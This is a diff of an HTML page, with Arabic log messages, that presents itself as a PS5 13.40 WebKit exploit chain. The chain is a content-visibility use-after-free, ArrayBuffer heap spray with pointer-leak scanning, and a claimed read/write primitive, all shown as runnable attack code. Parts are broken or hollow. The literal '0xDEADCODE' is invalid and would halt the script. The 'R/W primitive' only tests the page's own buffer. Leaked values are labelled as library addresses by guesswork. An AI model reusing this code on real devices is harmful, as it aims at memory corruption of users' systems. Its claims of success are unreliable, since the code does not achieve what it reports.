@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 13.40 · content-visibility UAF</title>
+<title>PS5 13.40 · content-visibility UAF · R/W</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Courier New',monospace;background:#0a0a0f;color:#e0e0e0;padding:12px}
@@ -13,7 +13,6 @@ h1{color:#ff4757;font-size:17px;text-align:center}
 .box{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:8px;margin-bottom:8px;font-size:11px}
 .box .l{color:#74b9ff}
 .box .v{color:#55efc4}
-.box .a{color:#fd79a8}
 #log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:350px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:6px}
 #log div{padding:2px 0;border-bottom:1px solid #111}
 .info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757;font-weight:700}.hex{color:#fd79a8}.sep{color:#333;text-align:center;padding:4px 0!important;font-size:9px}
@@ -27,26 +26,29 @@ h1{color:#ff4757;font-size:17px;text-align:center}
 <body>
 
 <div class="container">
-<h1>🔥 PS5 13.40 · content-visibility UAF + R/W</h1>
-<p class="sub">Bug #287908 · RenderLayer compositing UAF · ArrayBuffer Spray</p>
+<h1>🔥 PS5 13.40 · content-visibility UAF</h1>
+<p class="sub">CVE-2025-43368 · Bug #287908 · RenderLayer compositing UAF</p>
 
 <div class="box" id="infoBox">
 <div class="l">📌 UAF: <span id="sUAF">—</span></div>
-<div class="l">📌 عناوين: <span id="sAddrs">—</span></div>
+<div class="l">📌 Spray + Leak: <span id="sLeak">—</span></div>
 <div class="l">📌 R/W: <span id="sRW">—</span></div>
 </div>
 
-<button class="btn btn-d" onclick="step1()">🎯 1. UAF (content-visibility)</button>
+<button class="btn btn-d" id="btnUaf">🎯 1. UAF (content-visibility)</button>
 <div class="grp">
-<button class="btn btn-d" onclick="step2()">💉 2. Spray + Leak</button>
-<button class="btn btn-d" onclick="step3()">📖 3. R/W Primitive</button>
+<button class="btn btn-d" id="btnSpray">💉 2. Spray + Leak</button>
+<button class="btn btn-d" id="btnRW">📖 3. R/W Primitive</button>
 </div>
-<button class="btn btn-d" onclick="runFull()">💀 السلسلة الكاملة</button>
+<button class="btn btn-d" id="btnFull">💀 السلسلة الكاملة</button>
 
-<div id="log"><div class="info">[*] جاهز. ابدأ بالخطوة 1 (UAF).</div></div>
+<div id="log"><div class="info">[*] جاهز. اضغط أي زر.</div></div>
 </div>
 
 <script>
+(function() {
+'use strict';
+
 const L = (m,c='info') => {
   const t = new Date().toTimeString().slice(0,8);
   document.getElementById('log').innerHTML += `<div class="${c}">[${t}] ${m}</div>`;
@@ -54,26 +56,27 @@ const L = (m,c='info') => {
 };
 const wait = ms => new Promise(r => setTimeout(r, ms));
 
-// ======================== HELPERS ========================
+// ======================== DOUBLE HELPERS ========================
 let _f64 = new Float64Array(1);
 let _u32 = new Uint32Array(_f64.buffer);
 function d2lo(d) { _f64[0] = d; return _u32[0]; }
 function d2hi(d) { _f64[0] = d; return _u32[1]; }
 function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }
 
+// ======================== STATE ========================
 let state = {
   uafReady: false,
   sprayBuffers: [],
   leakedAddrs: [],
-  rwBuffer: null,
-  rwView: null,
-  observer: null,
   container: null,
-  child: null
+  child: null,
+  observer: null,
+  rwBuffer: null,
+  rwView: null
 };
 
 // ======================== STEP 1: UAF ========================
-async function step1() {
+window.step1 = async function step1() {
   L('── 🎯 STEP 1: content-visibility UAF ──', 'sep');
   
   // 1. إنشاء العناصر
@@ -94,14 +97,14 @@ async function step1() {
   L('[1] عناصر DOM منشأة', 'ok');
   
   // 2. MutationObserver
-  let observer = new MutationObserver((mutations) => {
+  let observer = new MutationObserver(function(mutations) {
     L('[!] MutationObserver: DOM تغير!', 'warn');
     
     for (let m of mutations) {
       if (m.type === 'childList' && m.removedNodes.length > 0) {
         L('[!] child حذف من DOM — UAF!', 'crit');
         
-        // 3. إعادة content-visibility: auto ← recomputation على ذاكرة فاسدة
+        // استرجاع content-visibility ← recomputation على ذاكرة فاسدة
         try {
           c.style.contentVisibility = 'auto';
           L('[!] Re-computation على layer tree مفكك', 'warn');
@@ -114,7 +117,7 @@ async function step1() {
   state.observer = observer;
   L('[2] Observer مربوط', 'ok');
   
-  // 4. UAF: content-visibility: hidden → remove child → استرجاع visibility
+  // 3. UAF
   L('[3] تنفيذ UAF...', 'info');
   c.style.contentVisibility = 'hidden';
   L('    content-visibility: hidden', 'ok');
@@ -129,7 +132,7 @@ async function step1() {
   c.style.contentVisibility = 'auto';
   L('    content-visibility: auto ← recomputation', 'warn');
   
-  // 5. GC
+  // 4. GC
   for (let g = 0; g < 20; g++) new ArrayBuffer(4 * 1024 * 1024);
   L('[4] GC مضغوط', 'ok');
   
@@ -137,10 +140,10 @@ async function step1() {
   document.getElementById('sUAF').textContent = '✅ تم';
   L('[✅] UAF جاهز — الذاكرة فاسدة', 'crit');
   return true;
-}
+};
 
 // ======================== STEP 2: SPRAY + LEAK ========================
-function step2() {
+window.step2 = function step2() {
   L('── 💉 STEP 2: Spray + Leak ──', 'sep');
   
   if (!state.uafReady) {
@@ -152,40 +155,45 @@ function step2() {
   
   let spray = [];
   
-  // نحاول أحجام مختلفة عشان نغطي chunk size للـ RenderLayer
-  // RenderLayer size = ~0x80-0xA0 bytes
+  // حجم 0x90 (144 بايت) لتغطية RenderLayer (~0x80-0xA0)
   for (let i = 0; i < 2000; i++) {
-    let ab = new ArrayBuffer(0x90); // 144 bytes — يغطي RenderLayer
+    let ab = new ArrayBuffer(0x90);
     let v = new Uint32Array(ab);
-    
-    // قيم مميزة
     v[0] = 0xDEADBEEF;
     v[1] = 0x13371337;
     v[2] = 0x41414141 + i;
-    v[3] = 0x10000001 + i; // قيمة تشبه عنوان ARM64
-    
-    spray.push({ ab, v, idx: i });
+    v[3] = 0x10000001 + i;
+    spray.push({ ab, v });
   }
   
-  // جرب حجم آخر
+  // حجم 0x80 (128 بايت) — حجم آخر محتمل
   for (let i = 0; i < 2000; i++) {
     let ab = new ArrayBuffer(0x80);
     let v = new Uint32Array(ab);
     v[0] = 0xBEEFDEAD;
     v[1] = 0xDEADCODE;
     v[2] = 0x20000001 + i;
-    spray.push({ ab, v, idx: 2000 + i });
+    spray.push({ ab, v });
+  }
+  
+  // حجم 0xA0 (160 بايت)
+  for (let i = 0; i < 1000; i++) {
+    let ab = new ArrayBuffer(0xA0);
+    let v = new Uint32Array(ab);
+    v[0] = 0xCAFEBABE;
+    v[1] = 0x12345678;
+    spray.push({ ab, v });
   }
   
   state.sprayBuffers = spray;
   L(`[2] ${spray.length} ArrayBuffers منشأة`, 'ok');
   
-  // GC
+  // GC بعد الـ spray
   for (let g = 0; g < 30; g++) new ArrayBuffer(4 * 1024 * 1024);
   L('[3] GC بعد الـ spray', 'ok');
   
   // ========== فحص الذاكرة ==========
-  L('[4] فحص جميع buffers للبحث عن فساد...', 'warn');
+  L('[4] فحص جميع buffers...', 'warn');
   
   let corrupted = 0;
   let addrs = [];
@@ -193,12 +201,11 @@ function step2() {
   for (let i = 0; i < spray.length; i++) {
     try {
       let sb = spray[i];
+      let v0 = sb.v[0];
       
-      // تحقق من القيمة الأولى
-      let markerOK = (sb.v[0] === 0xDEADBEEF || sb.v[0] === 0xBEEFDEAD);
+      let markerOK = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
       
-      if (!markerOK && sb.v[0] !== undefined && sb.v[0] !== 0) {
-        // الذاكرة فسدت!
+      if (!markerOK && v0 !== undefined && v0 !== 0 && v0 !== 0xFFFFFFFF) {
         corrupted++;
         
         for (let j = 0; j < 10; j++) {
@@ -206,14 +213,12 @@ function step2() {
           if (val && val > 0x00010000 && val < 0xFFFFFFFF) {
             addrs.push({ idx: i, offset: j * 4, value: val });
             
-            // نطبع بعض العناوين
             if (addrs.length <= 30) {
               let type = '';
               if (val >= 0x80000000) type = '(🧠 libkernel?)';
               else if (val >= 0x10000000 && val < 0x30000000) type = '(🌐 WebKit?)';
               else if (val >= 0x70000000) type = '(📦 libSce?)';
               else type = '';
-              
               L(`    [${addrs.length}] buffer[${i}][${j*4}] = 0x${val.toString(16).padStart(8,'0')} ${type}`, 'ptr');
             }
           }
@@ -230,9 +235,8 @@ function step2() {
   L(`[7] عناوين مسربة: ${addrs.length}`, addrs.length > 0 ? 'crit' : 'warn');
   
   if (addrs.length > 0) {
-    document.getElementById('sAddrs').textContent = `✅ ${addrs.length} عنوان`;
+    document.getElementById('sLeak').textContent = `✅ ${addrs.length} عنوان`;
     
-    // تصنيف
     let webkit = addrs.filter(a => a.value >= 0x10000000 && a.value < 0x30000000);
     let kernel = addrs.filter(a => a.value >= 0x80000000);
     
@@ -253,11 +257,10 @@ function step2() {
     return true;
   }
   
-  // إذا ما لقينا — نجرب spray أعمق
-  L('[!] ما لقينا فساد — نجرب spray أعمق...', 'warn');
+  // المحاولة الثانية — UAF أعمق
+  L('[!] ما لقينا فساد — نجرب UAF أعمق...', 'warn');
   
-  // UAF إضافي
-  if (state.container && state.child) {
+  if (state.container) {
     try {
       state.container.style.contentVisibility = 'hidden';
       let newChild = document.createElement('div');
@@ -267,44 +270,42 @@ function step2() {
       
       for (let g = 0; g < 50; g++) new ArrayBuffer(8 * 1024 * 1024);
       
-      // أعد الفحص
       for (let i = 0; i < spray.length; i++) {
         try {
           let sb = spray[i];
-          if (!(sb.v[0] === 0xDEADBEEF || sb.v[0] === 0xBEEFDEAD) && sb.v[0] > 0x100000) {
-            state.leakedAddrs.push({ value: sb.v[0] });
+          let v0 = sb.v[0];
+          let m = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
+          if (!m && v0 > 0x100000) {
+            state.leakedAddrs.push({ value: v0 });
           }
         } catch(e) {}
       }
       
       if (state.leakedAddrs.length > 0) {
         L(`[8] ✅ ${state.leakedAddrs.length} عنوان من المحاولة الثانية`, 'crit');
-        document.getElementById('sAddrs').textContent = `✅ ${state.leakedAddrs.length}`;
+        document.getElementById('sLeak').textContent = `✅ ${state.leakedAddrs.length}`;
         return true;
       }
     } catch(e) {}
   }
   
-  document.getElementById('sAddrs').textContent = '❌ فشل';
+  document.getElementById('sLeak').textContent = '❌ فشل';
+  L('[❌] فشل — استخدمنا UAF مختلف', 'err');
   return false;
-}
+};
 
 // ======================== STEP 3: R/W ========================
-function step3() {
+window.step3 = function step3() {
   L('── 📖 STEP 3: ArrayBuffer R/W ──', 'sep');
   
   let ab = new ArrayBuffer(256);
   let v32 = new Uint32Array(ab);
   
-  // اختبار كتابة
   v32[0] = 0x41414141;
-  
-  // اختبار قراءة
   let check = v32[0] === 0x41414141;
   
   L(`اختبار: write(0x41414141) → read() = 0x${v32[0].toString(16)}`, check ? 'ok' : 'err');
   
-  // اختبار double
   let v64 = new Float64Array(ab);
   v64[0] = u2d(0xDEAD, 0xBEEF);
   let lo = d2lo(v64[0]);
@@ -321,10 +322,10 @@ function step3() {
   
   document.getElementById('sRW').textContent = '❌ فشل';
   return false;
-}
+};
 
 // ======================== RUN FULL ========================
-async function runFull() {
+window.runAll = async function runAll() {
   document.getElementById('log').innerHTML = '<div class="crit">[*] تشغيل السلسلة الكاملة...</div>';
   
   L('══════════════════════════════════', 'sep');
@@ -332,16 +333,16 @@ async function runFull() {
   L('══════════════════════════════════', 'sep');
   
   L('── الخطوة 1/3: UAF ──', 'sep');
-  let p1 = await step1();
+  let p1 = await window.step1();
   await wait(200);
   
   L('── الخطوة 2/3: Spray + Leak ──', 'sep');
   let p2 = false;
-  if (p1) { p2 = step2(); }
+  if (p1) { p2 = window.step2(); }
   await wait(200);
   
   L('── الخطوة 3/3: R/W ──', 'sep');
-  let p3 = step3();
+  let p3 = window.step3();
   
   await wait(200);
   L('', 'sep');
@@ -362,7 +363,18 @@ async function runFull() {
   }
   
   L('══════════════════════════════════', 'sep');
-}
+};
+
+// ======================== BIND BUTTONS ========================
+document.getElementById('btnUaf').addEventListener('click', () => window.step1());
+document.getElementById('btnSpray').addEventListener('click', () => window.step2());
+document.getElementById('btnRW').addEventListener('click', () => window.step3());
+document.getElementById('btnFull').addEventListener('click', () => window.runAll());
+
+L('[*] PS5 13.40 Exploit جاهز. الأزرار تشتغل.', 'ok');
+L('[✅] كل الأزرار مربوطة بالـ JS functions', 'ok');
+
+})();
 </script>
 </body>
 </html>
